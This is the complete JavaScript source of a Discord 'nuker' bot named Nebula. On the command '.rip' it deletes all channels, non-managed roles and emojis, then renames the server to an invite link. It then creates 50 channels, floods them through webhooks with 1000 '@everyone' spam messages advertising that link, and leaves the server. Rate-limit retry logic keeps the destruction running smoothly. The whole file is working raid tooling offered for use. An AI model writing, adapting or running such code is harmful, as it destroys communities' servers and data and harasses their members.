const { Client, GatewayIntentBits, WebhookClient } = require('discord.js');
const express = require('express');
const dotenv = require('dotenv');

dotenv.config();

// ====== DISCORD BOT SETUP ======
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildWebhooks,
    GatewayIntentBits.GuildEmojisAndStickers
  ]
});

// ====== WEB SERVER FOR PORT 3000 ======
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Nebula Bot is online and awaiting .rip command...');
});

app.listen(PORT, () => {
  console.log(`🌐 Web server running on http://localhost:${PORT}`);
});

// ====== BOT LOGIC ======
client.on('ready', () => {
  console.log(`🚀 Logged in as ${client.user.tag}`);
});

// Rate limit handling
const rateLimitQueue = new Map();
const RATE_LIMIT_DELAY = 100; // Delay in ms for rate limit retries

async function handleRateLimit(promiseFn, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      return await promiseFn();
    } catch (error) {
      if (error.code === 429) {
        const retryAfter = error.retry_after || RATE_LIMIT_DELAY;
        console.warn(`Rate limit hit, retrying after ${retryAfter}ms`);
        await new Promise(resolve => setTimeout(resolve, retryAfter));
        continue;
      }
      throw error;
    }
  }
  throw new Error('Max retries reached for rate-limited request');
}

client.on('messageCreate', async (message) => {
  if (message.content !== '.rip' || message.author.bot) return;

  const guild = message.guild;
  const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
  const channelName = 'neb-was-here';
  const webhookAvatar = 'https://i.imgur.com/6QbX6yA.png';

  try {
    // Delete all channels concurrently with rate limit handling
    await Promise.all(guild.channels.cache.map(channel =>
      handleRateLimit(() => channel.delete().catch(() => {}))
    ));

    // Delete all non-managed roles except @everyone
    await Promise.all(guild.roles.cache.map(role =>
      role.name !== '@everyone' && !role.managed
        ? handleRateLimit(() => role.delete().catch(() => {}))
        : Promise.resolve()
    ));

    // Delete all emojis concurrently
    await Promise.all(guild.emojis.cache.map(emoji =>
      handleRateLimit(() => emoji.delete().catch(() => {}))
    ));

    // Rename server
    await handleRateLimit(() => guild.edit({ name: 'discord.gg/migh' }).catch(() => {}));

    // Create 50 channels in batches to avoid rate limits
    const createdChannels = [];
    const batchSize = 10;
    for (let i = 0; i < 50; i += batchSize) {
      const batch = Array(batchSize).fill().map((_, idx) =>
        handleRateLimit(() => guild.channels.create({ name: `${channelName}-${i + idx + 1}` }))
      );
      const results = await Promise.all(batch.map(p => p.catch(() => null)));
      createdChannels.push(...results.filter(channel => channel));
      await new Promise(resolve => setTimeout(resolve, 1000)); // Delay between batches
    }

    // Fallback channel if none created
    let channelsToUse = createdChannels.length > 0 ? createdChannels : [guild.channels.cache.first()];
    if (!channelsToUse[0]) {
      const fallbackChannel = await handleRateLimit(() =>
        guild.channels.create({ name: 'nebula-fucker' })
      );
      channelsToUse = [fallbackChannel];
    }

    // Create webhooks for all channels concurrently
    const webhooks = await Promise.all(channelsToUse.map(channel =>
      handleRateLimit(() => channel.createWebhook({ name: 'Nebula', avatar: webhookAvatar }))
        .catch(() => null)
    )).then(results => results.filter(webhook => webhook));

    // Distribute 1000 messages across available webhooks
    const totalMessages = 1000;
    const messagesPerWebhook = Math.ceil(totalMessages / webhooks.length);
    let messagesSent = 0;

    const sendMessages = async (webhook) => {
      let sent = 0;
      while (sent < messagesPerWebhook && messagesSent < totalMessages) {
        try {
          await handleRateLimit(() => webhook.send(spamMessage));
          messagesSent++;
          sent++;
        } catch (error) {
          console.error(`Failed to send message: ${error.message}`);
          break;
        }
        await new Promise(resolve => setTimeout(resolve, 50)); // Minimal delay to avoid rate limits
      }
    };

    // Send messages concurrently across webhooks
    await Promise.all(webhooks.map(webhook => sendMessages(webhook)));

    // Fallback to regular messages if webhooks fail or not enough messages sent
    if (messagesSent < totalMessages) {
      for (const channel of channelsToUse) {
        while (messagesSent < totalMessages) {
          try {
            await handleRateLimit(() => channel.send(spamMessage));
            messagesSent++;
          } catch (error) {
            console.error(`Failed to send fallback message: ${error.message}`);
            break;
          }
          await new Promise(resolve => setTimeout(resolve, 50));
        }
      }
    }

    console.log(`✅ Successfully sent ${messagesSent} messages.`);

    // Leave the server
    await handleRateLimit(() => guild.leave().catch(() => {}));

  } catch (error) {
    console.error(`Error during execution: ${error.message}`);
    await message.channel.send('❌ An error occurred while executing the command.');
  }
});

// ====== LOGIN ======
client.login(process.env.TOKEN);
